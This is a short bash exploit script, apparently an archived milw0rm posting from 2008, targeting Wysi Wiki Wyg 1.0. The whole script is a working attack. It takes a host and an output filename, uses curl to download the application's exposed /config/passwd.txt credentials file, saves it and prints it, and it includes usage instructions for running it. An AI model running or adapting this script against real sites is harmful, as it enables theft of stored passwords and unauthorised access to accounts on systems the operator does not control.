#!/bin/bash
# Wysi Wiki Wyg 1.0 Remote Password Retrieve Exploit
# by athos - staker[at]hotmail[dot]it

host=$1;
name=$2;
path='/config/passwd.txt';

if [ "$name" = "" ]; then
        echo "Usage: bash $0 [host/path] [filename]";
        echo "by athos - staker[at]hotmail[dot]it";
        exit;
fi;      

curl $host/$path > $name;
clear
cat $name;

# milw0rm.com [2008-12-12]
